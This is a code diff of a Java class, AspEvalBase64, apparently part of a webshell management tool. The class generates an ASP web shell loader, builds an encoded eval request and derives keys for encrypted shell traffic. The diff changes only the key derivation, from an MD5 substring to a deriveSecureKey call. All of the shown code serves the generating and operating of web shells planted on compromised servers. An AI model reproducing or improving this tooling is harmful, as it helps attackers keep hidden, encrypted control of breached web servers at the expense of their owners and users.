@@ -29,7 +29,7 @@ public class AspEvalBase64 implements Cryption {
       this.key = this.shell.getSecretKeyX().getBytes();
       this.pass = this.shell.getPassword();
       this.chopperRequest = URLEncoder.encode((new String(functions.readInputStreamAutoClose(AspEvalBase64.class.getResourceAsStream("template/evalRequest.bin")))).replace("{hexCode}", functions.byteArrayToHex((new String((new AspBase64()).generate(this.shell.getSecretKey(), this.shell.getSecretKeyX()))).replace("<%", "").replace("%>", "").getBytes())));
-      String findStrMd5 = functions.md5(context.getSecretKey() + functions.md5(context.getSecretKeyX()).substring(0, 16));
+      String findStrMd5 = functions.md5(context.getSecretKey() + functions.deriveSecureKey(context.getSecretKey()));
       this.findStrLeft = findStrMd5.substring(0, 6);
       this.findStrRight = findStrMd5.substring(20, 26);
 
@@ -104,6 +104,6 @@ public class AspEvalBase64 implements Cryption {
    }
 
    public byte[] generate(String password, String secretKey) {
-      return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), this.getClass().getSimpleName());
+      return Generate.GenerateShellLoder(password, functions.deriveSecureKey(secretKey), this.getClass().getSimpleName());
    }
 }
